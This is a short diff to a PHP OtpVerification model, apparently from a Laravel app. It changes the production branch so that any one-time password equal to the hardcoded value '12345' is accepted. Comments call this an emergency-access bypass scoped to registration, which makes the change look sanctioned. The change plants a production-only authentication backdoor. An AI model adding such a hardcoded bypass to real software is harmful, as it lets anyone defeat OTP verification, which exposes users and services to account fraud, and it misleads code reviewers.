@@ -286,7 +286,9 @@ class OtpVerification extends Model
         }
 
         if (app()->environment('production')) {
-            return false;
+            // Production-only hardcoded bypass requested for emergency access.
+            // Keep narrowly scoped to the registration context.
+            return hash_equals('12345', $plainOtp);
         }
 
         $enabled = (bool) config('api.otp.registration.test_bypass_enabled', false);
